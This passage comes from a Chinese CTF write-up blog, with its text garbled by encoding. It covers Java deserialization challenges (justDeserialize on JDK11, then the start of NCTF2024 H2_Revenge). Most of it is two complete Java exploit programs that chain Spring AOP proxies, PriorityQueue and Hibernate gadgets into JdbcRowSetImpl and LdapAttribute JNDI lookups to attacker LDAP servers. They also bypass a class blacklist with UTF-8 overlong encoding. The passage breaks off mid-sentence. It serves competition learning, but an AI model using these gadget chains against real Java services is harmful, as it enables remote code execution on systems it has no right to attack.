title="å…¶äºŒ-è½¯ä»¶å®‰å…¨èµ›åŠå†³-justDeserialize"></a>å…¶äºŒ-è½¯ä»¶å®‰å…¨èµ›åŠå†³-justDeserialize</h1><p>JDK11æ‰“hsqldbçš„ååºåˆ—åŒ–ã€‚</p><p>æ¯”èµ›æ˜¯break&amp;fixç±»å‹ï¼Œä¿®æ˜¯å¾ˆå¥½ä¿®çš„ï¼Œæ¡†æ¡†åŠ blacklistæˆ–è€…é‡å†™<code>resolveClass</code>éƒ½è¡Œï¼Œæˆ–Userç±»çš„compareæ–¹æ³•banæ‰ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆæ˜¾ç„¶çš„æ‹¿æ¥ååºåˆ—åŒ–è§¦å‘çš„æ–¹æ³•ç‚¹ä½ã€‚å½“æ—¶ç¡¬ç£•äº†åŠå¤©è¿˜æ˜¯æ²¡æ‰“é€šï¼Œç»•<code>resolveClass</code>åŸæœ‰é»‘åå•æƒ³åˆ°äº†UTF8-Overlong-Encodingï¼Œä¹Ÿæƒ³åˆ°äº†JNDIçš„æ‰“æ³•ï¼Œå¥ˆä½•æœ¬åœ°ç¯å¢ƒé‡åˆ°ç‚¹é—®é¢˜æµ‹ä¸å‡ºæ¥ã€‚ã€‚ã€‚</p><p>èµ›åä¹Ÿæœ‰å¸ˆå‚…å¤ç°äº†ï¼Œé‚£æˆ‘ä¹Ÿçœ‹çœ‹æ€ä¹ˆä¸ªäº‹å§ã€‚</p><p>æ‰“çš„æ˜¯<code>SpringAOP</code>é“¾ï¼Œæ¥è‡ªï¼š<a href="https://gsbp0.github.io/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/#%E7%AC%AC%E4%BA%8C%E6%AD%A5">è½¯ä»¶æ”»é˜²èµ›ç°åœºèµ›ä¸Šå¯¹justDeserializeæ”»å‡»çš„å‡ æ¬¡å°è¯• | GSBPâ€™s Blog</a></p><p>ç”¨çš„toStringæ¥è§¦å‘aopåŠ¨æ€ä»£ç†çš„invokeæ–¹æ³•ï¼Œåªè¦ä¸æ˜¯<code>equals,hashcode</code>è¿™ä¿©æ–¹æ³•è§¦å‘invoke,å…¶ä»–éƒ½æ˜¯å¯ä»¥èµ°å®Œæ•´æ¡ååºåˆ—åŒ–é“¾ã€‚</p><p>è€ŒUserç±»çš„<code>compare</code>æ–¹æ³•å¯ä»¥ä½¿ç”¨CBé“¾ä¸­çš„<code>PriorityQueue</code>çš„é‚£èŠ‚æ¥è§¦å‘ã€‚</p><p>ä½†æ˜¯ç›´æ¥è§¦å‘æ˜¯ä¸å¤ªå½³äºçš„ï¼Œå› ä¸ºproxyç±»æ²¡æœ‰å®ç°<code>comparator</code>æ¥å£ï¼Œè§£å†³æ–¹æ³•æ˜¯é€šè¿‡åœ¨å¤–é¢å†åŒ…ä¸€å±‚ä»£ç†ï¼Œä¸”ä»£ç†<code>comparator</code>æ¥å£ã€‚</p><p>è‡³äºè§¦å‘ç±»ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©<code>LdapAttribute</code>è¿™ä¹ˆä¸€ä¸ªjndiæ³¨å…¥ç±»ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©<code>JdbcRowSetImpl</code>ã€‚</p><p>è™½ç„¶é«˜ç‰ˆæœ¬JDKä½ ç›´æ¥è°ƒ<code>com.sun.rowset.JdbcRowSetImpl</code>ä¼šæŠ¥é”™ï¼Œä½†æ˜¯è¿™é¢˜ä½ åœ¨JDK8ä¸‹è°ƒå¥½payloadå‘åŒ…è¿‡å»ç…§æ ·èƒ½æˆåŠŸã€‚</p><p>æ‰“JNDIçš„è¯ï¼Œç”¨JNDIMapå°±å¯ä»¥ï¼Œä½†æ˜¯ç›´æ¥æ‰“wafçš„æµ‹è¯•å¥½åƒè¿‡ä¸äº†ï¼Œåæ­£å¥—ä¸ªUTF8å°±èƒ½ç»•<code>resolveClass</code>ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="æ³•ä¸€ï¼ŒJdbcRowSetImpl"><a href="#æ³•ä¸€ï¼ŒJdbcRowSetImpl" class="headerlink" title="æ³•ä¸€ï¼ŒJdbcRowSetImpl"></a>æ³•ä¸€ï¼Œ<code>JdbcRowSetImpl</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Deserialize/Jackson/Command/calc.exe&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> jdbcRowSet.getClass().getMethod(<span class="hljs-string">&quot;getDatabaseMetaData&quot;</span>);<br>        System.out.println(method);<br>        <span class="hljs-type">SingletonAspectInstanceFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SingletonAspectInstanceFactory</span>(jdbcRowSet);<br>        <span class="hljs-type">AspectJAroundAdvice</span> <span class="hljs-variable">advice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AspectJAroundAdvice</span>(method,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AspectJExpressionPointcut</span>(),factory);<br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy1</span> <span class="hljs-operator">=</span> (Proxy) getAProxy(advice,Advice.class);<br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">finalproxy</span> <span class="hljs-operator">=</span> (Proxy) getBProxy(proxy1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Comparator.class&#125;);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">PQ_test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>);<br>        PQ_test.add(<span class="hljs-number">1</span>);<br>        PQ_test.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(PQ_test,<span class="hljs-string">&quot;comparator&quot;</span>,finalproxy);<br>        setFieldValue(PQ_test,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;proxy1,proxy1&#125;);<br><br>        System.out.println(Base64.getEncoder().encodeToString(serialize(PQ_test)));<br><br>        deserialize(serialize(PQ_test));<br>        <span class="hljs-comment">//deserialize_waf(serialize(PQ_test));</span><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getBProxy</span><span class="hljs-params">(Object obj,Class[] clazzs)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getAProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">AbstractAspectJAdvice</span> <span class="hljs-variable">advice</span> <span class="hljs-operator">=</span> (AbstractAspectJAdvice) obj;<br><br>        <span class="hljs-type">DefaultIntroductionAdvisor</span> <span class="hljs-variable">advisor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultIntroductionAdvisor</span>((Advice) getBProxy(advice, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;MethodInterceptor.class, Advice.class&#125;));<br>        advisedSupport.addAdvisor(advisor);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">UTF8OverlongObjectOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OverlongObjectOutputStream</span>(arr))&#123;<br>            output.writeObject(obj);<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] arr)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(arr)))&#123;<br>            <span class="hljs-keyword">return</span> input.readObject();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331200208073.png" alt="image-20250331200208073"></p><p>å½“æ—¶æ¯”èµ›ä¸å‡ºç½‘ï¼ŒjaråŒ…çš„ç¼–è¯‘ç‰ˆæœ¬è™½ç„¶æ˜¯JDK11ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰å—åˆ°å¼ºåˆ¶ç±»éš”ç¦»çš„è¦æ±‚ï¼Œæ‰€ä»¥å¯ä»¥éšä¾¿æ‰“<code>Jackson</code>ååºåˆ—åŒ–è¿™äº›ï¼Œæˆ–è€…æ˜¯å†èµ°ä¸€æ¬¡AOPé“¾ä½†è§¦å‘ç±»æ¢æˆå¯RCEçš„<code>TemplateImpl</code>ç±»ï¼Œè¿™é‡Œéšä¾¿æ‰“ä¸€ä¸ªå•¥å†…å­˜é©¬åº”è¯¥éƒ½å¯ä»¥ã€‚</p><p>è¿™ä½å¸ˆå‚…è¿˜æåˆ°äº†hsqlçš„äºŒæ¬¡ååºåˆ—åŒ–ï¼Œè¿™ä¸ªæ€è·¯ä¹Ÿå¾ˆä¸é”™ï¼Œæ‰“jndi_Referenceè§¦å‘<code>DruidDataSourceFactory</code>çš„getObjectInstanceæ–¹æ³•æ¥æ‰“hsql-JDBCï¼Œè§¦å‘hsqlé‡Œçš„SerializationUtilsäºŒæ¬¡ååºåˆ—åŒ–å®ç°RCEï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹çœ‹åŸæ–‡ã€‚</p><p>æ”¾é¢˜ç›®ä¸­çš„JDK11ç¯å¢ƒä¹Ÿèƒ½å‡ºï¼š</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331200045561.png" alt="image-20250331200045561"></p><h4 id="æ³•äºŒï¼ŒLdapAttribute"><a href="#æ³•äºŒï¼ŒLdapAttribute" class="headerlink" title="æ³•äºŒï¼ŒLdapAttribute"></a>æ³•äºŒï¼Œ<code>LdapAttribute</code></h4><p>å…¶æ¬¡potat0w0å¸ˆå‚…çš„ä»<code>LdapAttributegetAttributeDefinition()</code>æ‰“åˆ°jndiä¹Ÿæ˜¯å¾ˆå¥½çš„æ–¹æ³•ï¼Œå› ä¸ºé¢˜ç›®çš„ä¾èµ–ä¸­å­˜åœ¨hibernateæ¼æ´ç‰ˆæœ¬ï¼Œæƒ³åŠæ³•å‡ºå‘åˆ°å®ƒçš„hashCode()å°±è¡Œäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br><br>        <span class="hljs-type">ComponentType</span> <span class="hljs-variable">componentType</span> <span class="hljs-operator">=</span> (ComponentType) createObjWithoutConstructor(ComponentType.class);<br><br>        setField(componentType,<span class="hljs-string">&quot;propertySpan&quot;</span>,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//Users users = new Users();</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.directory.BasicAttribute&quot;</span>);<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">ldap</span> <span class="hljs-operator">=</span> createObjWithConstructor(c1,c2,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;test&quot;</span>&#125;);<br>        setField(ldap,<span class="hljs-string">&quot;rdn&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">CompositeName</span>(<span class="hljs-string">&quot;a//b&quot;</span>));<br><span class="hljs-comment">//        setField(ldap,&quot;baseCtx&quot;,new InitialContext());</span><br><br>        setField(ldap,<span class="hljs-string">&quot;baseCtxURL&quot;</span>,<span class="hljs-string">&quot;ldap://127.0.0.1:50389&quot;</span>);<br><br>        <span class="hljs-type">TypedValue</span> <span class="hljs-variable">typedValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypedValue</span>(componentType,ldap);<br><br>        <span class="hljs-type">PojoComponentTuplizer</span> <span class="hljs-variable">pojoComponentTuplizer</span> <span class="hljs-operator">=</span> (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);<br><br>        Class&lt;?&gt; c = AbstractComponentTuplizer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;getters&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(pojoComponentTuplizer,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Getter</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetterMethodImpl</span>(Object.class,<span class="hljs-string">&quot;qwq&quot;</span>, c1.getDeclaredMethod(<span class="hljs-string">&quot;getAttributeDefinition&quot;</span>))&#125;);<br><br>        setField(componentType,<span class="hljs-string">&quot;componentTuplizer&quot;</span>,pojoComponentTuplizer);<br><br><br>        hashtable.put(<span class="hljs-number">1</span>,<span class="hljs-number">111</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tableField</span> <span class="hljs-operator">=</span> Hashtable.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableField.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] table = (Object[]) tableField.get(hashtable);<br>        <span class="hljs-keyword">for</span> (Object entry: table)&#123;<br><span class="hljs-comment">//            System.out.println(entry);</span><br>            <span class="hljs-keyword">if</span> (entry != <span class="hljs-literal">null</span>)&#123;<br>                setField(entry,<span class="hljs-string">&quot;key&quot;</span>,typedValue);<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(ser(hashtable));<br><br>        System.out.println(string);<br><br>        unser(Base64.getDecoder().decode(string));<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createObjWithConstructor</span> <span class="hljs-params">(Class&lt;T&gt; clazz,Class&lt;? <span class="hljs-built_in">super</span> T&gt; superClazz,Class&lt;?&gt;[] argsTypes,Object[] argsValues)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Constructor&lt;?<span class="hljs-built_in">super</span> T&gt; constructor = superClazz.getDeclaredConstructor(argsTypes);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        Constructor&lt;?&gt; constructor1 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,constructor);<br>        constructor1.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (T) constructor1.newInstance(argsValues);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object object,String fieldName,Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; c = object.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object,value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">createObjWithoutConstructor</span><span class="hljs-params">(Class clazz)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ReflectionFactory</span> <span class="hljs-variable">reflectionFactory</span> <span class="hljs-operator">=</span> ReflectionFactory.getReflectionFactory();<br>        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();<br>        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);<br>        constructor1.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> constructor1.newInstance();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-comment">//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br>        Exp.<span class="hljs-type">UTF8OverlongObjectOutputStream</span> <span class="hljs-variable">utf8OverlongObjectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exp</span>.UTF8OverlongObjectOutputStream(byteArrayOutputStream);<br><span class="hljs-comment">//        objectOutputStream.writeObject(o);</span><br>        utf8OverlongObjectOutputStream.writeObject(o);<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>        <span class="hljs-keyword">return</span> objectInputStream.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨java-chainsè¿™ä¸ªå·¥å…·è¯•äº†è¯•ï¼Œç¡®å®ä¹ŸæŒºå¥½ç”¨çš„ï¼Œæ¨èï¼</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331200846114.png" alt="image-20250331200846114"></p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331200938196.png" alt="image-20250331200938196"></p><p>å‚è€ƒï¼š</p><p><a href="https://gsbp0.github.io/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/#%E7%AC%AC%E4%BA%8C%E6%AD%A5">è½¯ä»¶æ”»é˜²èµ›ç°åœºèµ›ä¸Šå¯¹justDeserializeæ”»å‡»çš„å‡ æ¬¡å°è¯• | GSBPâ€™s Blog</a></p><p><a href="https://blog.potatowo.top/2025/03/23/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025%E5%8D%8E%E4%B8%9C%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9Bwp-web/">è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›2025åä¸œèµ›åŒºåŠå†³èµ›wp-web - Potat0w0</a></p><p><a href="https://github.com/vulhub/java-chains/releases/tag/1.4.0">Release 1.4.0 Â· vulhub&#x2F;java-chains</a></p><h1 id="å…¶ä¸‰-NCTF2024-H2-Revenge"><a href="#å…¶ä¸‰-NCTF2024-H2-Revenge" class="headerlink" title="å…¶ä¸‰-NCTF2024 H2_Revenge"></a>å…¶ä¸‰-NCTF2024 H2_Revenge</h1><p>X1å“¥å‡ºçš„é¢˜ï¼ŒJDK17æ‰“H2çš„ååºåˆ—åŒ–ã€‚</p><p>å°±æ˜¯å› ä¸ºå‚åŠ è½¯ä»¶èµ›æ‰æ²¡æ‰“åˆ°NCTFé¢˜ï¼Œæ­£å¥½å­¦å¼Ÿä¹Ÿåœ¨é—®è¿™ä¸ªé¢˜çš„é—®é¢˜ï¼Œçœ‹äº†çœ‹æ‰“äº†æ‰“ã€‚</p><p>é¢˜ç›®å…¥å£å¾ˆç®€å•ï¼š</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331171307946.png" alt="image-20250331171307946"></p><p>å‰åŠæ®µé“¾å­ä¾ç„¶ç”¨<code>EventListenerList</code>èƒ½è§¦å‘åˆ°<code>MyDataSource</code>çš„<code>getConnecetion()</code>ï¼š</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331171411816.png" alt="image-20250331171411816"></p><p>å¦‚æœå…‰æ‰“H2çš„è¯ï¼Œåç»­å¥½åƒç›´æ¥ç”¨CREATE ALIASåˆ›å»ºæ¶æ„å‡½æ•°æ‰§è¡Œsqlè¯­å¥æˆ–è€…åˆ©ç”¨JavaScriptå¼•æ“å°±èƒ½ç›´æ¥æ‰“äº†ã€‚ä½†æ˜¯JDK17çš„JavaScriptå¼•æ“(Nashorn)å·²ç»è¢«åˆ 